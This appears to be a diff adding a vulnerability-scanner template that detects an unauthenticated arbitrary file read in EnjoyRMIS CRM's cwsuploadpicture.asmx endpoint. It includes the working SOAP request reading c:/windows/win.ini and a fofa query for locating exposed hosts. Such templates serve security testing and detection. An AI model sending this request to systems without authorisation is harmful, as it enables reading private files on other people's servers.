@@ -1,0 +1,41 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: |
+      <?xml version="1.0" encoding="utf-8"?>
+      <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+          <GetPicture xmlns="http://tempuri.org/">
+            <sFullFileName>c:/windows/win.ini</sFullFileName>
+          </GetPicture>
+        </soap:Body>
+      </soap:Envelope>
+    headers:
+      Content-Type: text/xml; charset=utf-8
+      SOAPAction: http://tempuri.org/GetPicture
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - OyBmb3IgMTYtYml0IGFwcC
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/enjoyRMIS_WS/WS/Common/cwsuploadpicture.asmx'
+id: enjoycrm-cwsuploadpicture-fileread
+info:
+  author: ZacharyZcR
+  description: |-
+    EnjoyRMIS CRM system has a file read vulnerability in cwsuploadpicture.asmx interface.
+    Unauthenticated attackers can read arbitrary system files through this vulnerability.
+    fofa: body="/ClientBin/slEnjoy.App.xap"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: EnjoyRMIS CRM cwsuploadpicture.asmx Arbitrary File Read
+  severity: high
+  tags: enjoycrm,lfi,fileread,argus-import
